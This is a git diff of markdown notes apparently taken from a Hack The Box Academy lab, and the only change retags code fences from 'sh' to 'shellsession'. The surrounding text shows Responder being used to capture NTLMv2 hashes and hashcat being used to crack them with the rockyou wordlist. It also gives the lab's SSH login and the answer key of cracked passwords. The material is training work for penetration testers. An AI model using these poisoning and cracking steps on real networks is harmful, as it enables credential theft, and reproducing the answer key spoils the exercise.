@@ -41,7 +41,7 @@ Responder also has support for:
 
 ## Responder in Action
 
-```sh
+```shellsession
 masterofblafu@htb[/htb]$ responder -h
                                          __
   .----.-----.-----.-----.-----.-----.--|  |.-----.----.
@@ -103,7 +103,7 @@ Some common options we'll typically want to use are -wf; this will start the WPA
 
 Typically we should start Responder and let it run for a while in a tmux window while we perform other enumeration tasks to maximize the number of hashes that we can obtain. Once we are ready, we can pass these hashes to Hashcat using hash mode `5600` for NTLMv2 hashes that we typically obtain with Responder. We may at times obtain NTLMv1 hashes and other types of hashes and can consult the [Hashcat example hashes](https://hashcat.net/wiki/doku.php?id=example_hashes) page to identify them and find the proper hash mode. If we ever obtain a strange or unknown hash, this site is a great reference to help identify it.
 
-```sh
+```shellsession
 $ sudo responder -I ens224
 ```
 
@@ -111,7 +111,7 @@ $ sudo responder -I ens224
 SSH to **10.129.11.144 (ACADEMY-EA-ATTACK01)** with user `htb-student` and password `HTB_@cademy_stdnt!`
 1. Run Responder and obtain a hash for a user account that starts with the letter b. Submit the account name as your answer. **Answer: backupagent**
    - Start responder to listen on interface ens224:
-        ```sh
+        ```shellsession
         $ sudo responder -I ens224
         <SNIP>
         [*] Skipping previously captured hash for INLANEFREIGHT\lab_adm
@@ -123,7 +123,7 @@ SSH to **10.129.11.144 (ACADEMY-EA-ATTACK01)** with user `htb-student` and passw
 2. Crack the hash for the previous account and submit the cleartext password as your answer. **Answer: h1backup55**
    - Store the found NTLMv2 hash in `hash.txt`
    - Use hashcat to crack this NTLMv2 hash using the `rockyou` wordlist:
-        ```sh
+        ```shellsession
         $ hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
         hashcat (v6.2.6) starting
 
@@ -135,7 +135,7 @@ SSH to **10.129.11.144 (ACADEMY-EA-ATTACK01)** with user `htb-student` and passw
         ```
 3. Run Responder and obtain an NTLMv2 hash for the user wley. Crack the hash using Hashcat and submit the user's password as your answer. **Answer: transporter@4**
    - View responder log at `/usr/share/responder/logs` and look for wley's captured NTLMv2 hash:
-        ```sh
+        ```shellsession
         $ cd /usr/share/responder/logs
         $ cat *.txt | grep wley
         <SNIP>
@@ -143,7 +143,7 @@ SSH to **10.129.11.144 (ACADEMY-EA-ATTACK01)** with user `htb-student` and passw
         ```
    - Store the found NTLMv2 hash in `hash.txt`
    - Use hashcat to crack this NTLMv2 hash using the `rockyou` wordlist:
-        ```sh
+        ```shellsession
         $ hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
         hashcat (v6.2.6) starting
 
